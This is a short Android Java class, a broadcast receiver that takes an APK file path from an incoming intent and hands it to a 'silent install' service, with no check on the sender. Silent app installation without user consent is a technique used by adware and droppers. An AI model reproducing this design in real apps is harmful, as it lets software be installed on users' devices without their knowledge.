package com.xstd.active.plugin;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class SilentInstallReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		String path = intent.getStringExtra("apk_path");
		Log.w("ps", "收到广播了，开启服务安装："+path);
		if (path == null || path.equals("")) return;
		Intent service = new Intent(context, SilentInstallService.class);
		service.putExtra("apk_path", path);
		context.startService(service);
	}

}
